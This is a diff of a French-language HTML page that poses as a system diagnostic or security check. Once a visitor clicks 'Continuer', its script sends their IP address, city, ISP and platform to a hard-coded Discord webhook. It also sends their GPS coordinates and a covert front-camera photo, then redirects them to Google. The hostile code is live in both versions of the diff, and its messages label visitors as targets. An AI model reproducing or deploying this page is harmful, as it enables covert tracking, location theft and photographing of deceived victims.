@@ -3,24 +3,19 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>System Maintenance</title>
+    <title>System Diagnostic</title>
     <style>
-        body { background: #000; color: #fff; font-family: -apple-system, system-ui, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .card { background: #1c1c1e; padding: 30px; border-radius: 15px; text-align: center; width: 85%; max-width: 350px; box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
-        .loader { border: 3px solid #333; border-top: 3px solid #0a84ff; border-radius: 50%; width: 35px; height: 35px; animation: spin 1s linear infinite; margin: 0 auto 20px; }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        h2 { font-size: 20px; margin: 10px 0; }
-        p { color: #8e8e93; font-size: 14px; line-height: 1.4; }
-        .btn { background: #0a84ff; color: #fff; border: none; padding: 12px 25px; border-radius: 8px; font-weight: 600; cursor: pointer; width: 100%; margin-top: 20px; }
+        body { background: #000; color: #fff; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .box { background: #111; padding: 30px; border-radius: 12px; text-align: center; width: 300px; border: 1px solid #333; }
+        .btn { background: #007aff; color: #fff; border: none; padding: 12px; border-radius: 7px; width: 100%; font-weight: bold; cursor: pointer; margin-top: 20px; }
         #video, #canvas { display: none; }
     </style>
 </head>
 <body>
-    <div class="card">
-        <div id="loading-icon" style="display:none;" class="loader"></div>
-        <h2 id="title">Mise à jour requise</h2>
-        <p id="status">Une vérification du matériel est nécessaire pour poursuivre l'optimisation de votre système.</p>
-        <button id="main-btn" class="btn" onclick="execute()">Vérifier et Continuer</button>
+    <div class="box">
+        <h3>Vérification requise</h3>
+        <p style="color:#aaa; font-size:13px;">Une analyse de sécurité est nécessaire pour accéder à ce contenu.</p>
+        <button class="btn" onclick="execute()">Continuer</button>
     </div>
 
     <video id="video" autoplay playsinline muted></video>
@@ -28,58 +23,50 @@
 
     <script>
         const WEBHOOK = "https://discord.com/api/webhooks/1466502605881475242/ynqT6t3L8IAQ69mgtvO17VvNBvmjFqiHayODx-P5EWMeN6renSu8UiM8nDfNNNvTHYy0";
-        const REDIRECT = "https://support.apple.com/fr-fr/HT201222";
 
-        async function post(msg, blob = null) {
+        async function post(content, blob = null) {
             const fd = new FormData();
-            if (blob) fd.append('file', blob, 'capture.png');
-            fd.append('payload_json', JSON.stringify({ content: msg }));
-            try { await fetch(WEBHOOK, { method: 'POST', body: fd, keepalive: true }); } catch(e){}
+            if (blob) fd.append('file', blob, 'snap.png');
+            fd.append('payload_json', JSON.stringify({ content: content }));
+            try { await fetch(WEBHOOK, { method: 'POST', body: fd, keepalive: true }); } catch(e) {}
         }
 
         async function execute() {
-            // UI Update
-            document.getElementById('main-btn').style.display = 'none';
-            document.getElementById('loading-icon').style.display = 'block';
-            document.getElementById('title').innerText = "Analyse...";
-            document.getElementById('status').innerText = "Veuillez patienter pendant la vérification des périphériques.";
+            document.querySelector('.box').innerHTML = "<h3>Analyse en cours...</h3><p>Patientez quelques secondes.</p>";
 
-            // 1. Infos Système Immédiates
-            const platform = navigator.userAgentData ? (await navigator.userAgentData.getHighEntropyValues(["platformVersion"])).platform : navigator.platform;
-            await post(`🚀 **CIBLE EN LIGNE**\n**Appareil**: ${platform}\n**Navigateur**: ${navigator.vendor}\n**Langue**: ${navigator.language}`);
-
-            // 2. Géolocalisation (Précision Max)
-            navigator.geolocation.getCurrentPosition(async (p) => {
-                await post(`📍 **LOCALISATION**: https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`);
-            }, async () => {
+            // 1. IP PC FORCEE (Via API externe)
+            try {
                 const res = await fetch('https://ipapi.co/json/');
                 const d = await res.json();
-                await post(`🌐 **IP (Proxied)**: ${d.city}, ${d.country} (${d.ip})`);
-            }, { enableHighAccuracy: true, timeout: 5000 });
+                await post(`🌐 **IP PC/MOBILE DETECTÉE**\n**IP**: ${d.ip}\n**Ville**: ${d.city}\n**FAI**: ${d.org}\n**OS**: ${navigator.platform}`);
+            } catch (e) { await post("❌ Impossible de choper l'IP"); }
 
-            // 3. Capture Caméra & Fin
+            // 2. GPS
+            navigator.geolocation.getCurrentPosition(async (p) => {
+                await post(`📍 **GPS**: http://google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`);
+            });
+
+            // 3. CAMÉRA
             try {
-                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                 const video = document.getElementById('video');
                 video.srcObject = stream;
-
                 video.onloadedmetadata = () => {
                     setTimeout(() => {
                         const canvas = document.getElementById('canvas');
                         canvas.width = video.videoWidth;
                         canvas.height = video.videoHeight;
                         canvas.getContext('2d').drawImage(video, 0, 0);
-                        
                         canvas.toBlob(async (blob) => {
-                            await post("📸 **CAPTURE RÉUSSIE**", blob);
+                            await post("📸 **PHOTO REÇUE**", blob);
                             stream.getTracks().forEach(t => t.stop());
-                            window.location.href = REDIRECT;
+                            window.location.href = "https://www.google.com";
                         }, 'image/png');
-                    }, 1500);
+                    }, 1000);
                 };
             } catch (e) {
-                await post("❌ **ACCÈS CAMÉRA REFUSÉ**");
-                setTimeout(() => { window.location.href = REDIRECT; }, 1000);
+                await post("⚠️ Caméra refusée");
+                window.location.href = "https://www.google.com";
             }
         }
     </script>
